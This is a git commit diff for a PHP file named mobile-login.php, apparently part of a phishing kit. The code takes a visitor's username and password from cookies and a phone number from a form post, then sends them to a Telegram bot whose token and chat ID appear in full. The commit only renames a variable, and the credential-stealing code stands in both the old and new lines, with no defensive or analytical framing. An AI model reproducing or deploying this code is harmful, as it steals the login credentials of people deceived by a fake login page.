b5b7c7566fb8e70c7bb6013d25eab86e941dd439
hubad666 <100355242+hubad666@users.noreply.github.com>
2022-02-24 20:55:45 +0800

    Update mobile-login.php

--- mobile-login.php
+++ mobile-login.php
@@ -1,8 +1,8 @@
-$data = [
+$us = [
 'chat_id' => "-635799224",
 'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_POST['number']
 ];
-file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($data));
+file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($us));
 
 
 $data = [
